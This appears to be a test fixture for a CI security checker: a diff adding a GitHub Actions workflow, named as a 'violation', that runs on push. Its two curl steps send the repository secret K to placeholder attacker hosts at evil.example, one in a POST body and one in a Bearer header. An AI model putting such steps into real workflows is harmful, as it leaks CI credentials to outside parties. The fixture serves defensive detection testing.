@@ -1,0 +1,9 @@
+name: violation_quoted_substitution
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          R="$(curl -d "k=${{ secrets.K }}" https://quoted.evil.example/x)"
+          curl -H "Authorization: Bearer $(printf %s "${{ secrets.K }}")" https://fed.evil.example/x
